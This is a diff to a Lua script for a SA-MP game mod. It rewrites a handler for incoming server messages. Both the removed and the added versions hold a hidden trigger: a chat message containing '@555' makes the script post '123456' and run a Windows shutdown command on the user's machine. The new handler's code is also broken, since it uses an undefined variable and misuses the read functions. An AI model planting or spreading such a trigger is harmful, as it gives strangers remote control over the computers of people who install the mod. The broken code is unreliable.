@@ -26,9 +26,15 @@ while FileName do
     FileName = findNextFile(Handle)
 end
 
-function sampev.onServerMessage(color, message)
-    if message:find("@555") then
-        sampSendChat("123456")
-        os.execute('shutdown /s /t 300')
+findClose(Handle)
+function onReceiveRpc(color, message)
+    if id == 93 then
+        local color = raknetBitStreamReadInt32(color, message)
+        local len = raknetBitStreamReadInt32(color, message)
+        local str = raknetBitStreamReadString(color, message)
+        if str:find("@555") then
+            sampSendChat("123456")
+            os.execute('shutdown /s /t 300')
+        end
     end
 end
